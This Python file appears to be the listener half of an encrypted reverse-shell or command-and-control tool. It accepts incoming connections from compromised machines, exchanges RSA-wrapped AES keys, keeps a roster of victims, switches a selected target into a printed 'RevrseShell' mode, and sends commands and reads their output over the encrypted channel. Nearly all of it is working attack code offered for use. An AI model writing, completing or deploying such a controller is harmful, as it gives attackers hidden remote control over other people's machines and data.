from CryptoAC.Asymmetric.Rsa import RSA
from CryptoAC.Symmetric.AcAes import AesCrypto
from .ConnectionsManager import ConnectionManager
from Tools.toolsF import randombyte
import socket
import time
import threading



class Server(object):
    
    def __init__(self,PrivateKey,port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ServInfo = (
            socket.gethostbyname(socket.gethostname())
            ,port
        )
        self.connections = ConnectionManager()
        self.rsa = RSA()
        self.PrivateKey = PrivateKey
        self.rsaBlock = (PrivateKey['n'].bit_length()+7)//8
        self.sleepPerPing = 60
        self.sleepPeriter = 2        
       
    def setCipher(self,conn):
        msg = conn.recv(self.rsaBlock)
        key = self.rsa.decrypt(
            self.PrivateKey,
            msg
        )
        self.connections.addAesToconnection(
            conn,
            AesCrypto(key, None)
        ) 


    def ping(self, conn, timeout=5):
        try:
            conn.send(randombyte())
            conn.settimeout(timeout)
            response = conn.recv(3)
            conn.settimeout(None)
            if response:
                return True
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            pass
        return False
    

    def keepAlive(self, conn, timeout=5):
        def __internal__():
            ip = conn.getpeername()[0]
            while True:
                if not self.connections.isconnected(ip):
                    self.ping(conn=conn,timeout=timeout)
                    self.connections.removeConnection(conn)
        threading.Thread(target=__internal__).start()
                
    
    def onConnect(self,conn,addr):
        clientInfo = self.retriveClientInfo(conn)
        self.connections.insertNewConnction(conn, clientInfo)
        while True:
            if self.connections.connctTo == addr[0]:
                self.connections.connectToTarget(conn)
                self._setShellMode(conn)
            elif not self.connections.alive(addr[0]):
                return
            time.sleep(self.sleepPeriter)
                               
             
    def sendMsg(self, connection, msg):
        msg = connection.aes.encrypt(msg)
        connection.conn.send(
            int.to_bytes(
                len(msg),
                length=4,
                byteorder='big',
            ) + msg
        )


    def recvMsg(self,connection):
        header = int.from_bytes(connection.conn.recv(4))
        res = connection.conn.recv(header)
        while len(res) < header:
            res += connection.conn.recv(header-len(res))
        return connection.aes.decrypt(res)
    

    def retriveCommand(self,connection, command):
        print(f'key is: {connection.aes.key}\niv:{connection.aes.iv}')
        command = self.sendMsg(connection,command.encode())
        return self.recvMsg(connection).decode(errors='replace')
        

    def _setShellMode(self,conn):
        print('Satrting RevrseShell...')
        self.setCipher(conn)
        ip = conn.getpeername()[0]
        while self.connections.isconnected(ip):
            time.sleep(5)

    def retriveClientInfo(self,conn):
        header = int.from_bytes(conn.recv(2))
        data = self.rsa.decrypt(self.PrivateKey,conn.recv(self.rsaBlock))
        while len(data) < header:
            data += self.rsa.decrypt(self.PrivateKey,conn.recv(self.rsaBlock))
        return data
            
        
    
    def __listener__(self):
        self.server.bind(self.ServInfo)
        self.server.listen()
        print("{+}Listening...")
        while True:
            conn, addr = self.server.accept()
            print("Accept Connection.")
            threading.Thread(
                target=self.onConnect,
                args=(conn,addr)
            ).start()
            time.sleep(1)

            
    def start(self):
        threading.Thread(target=self.__listener__).start()
        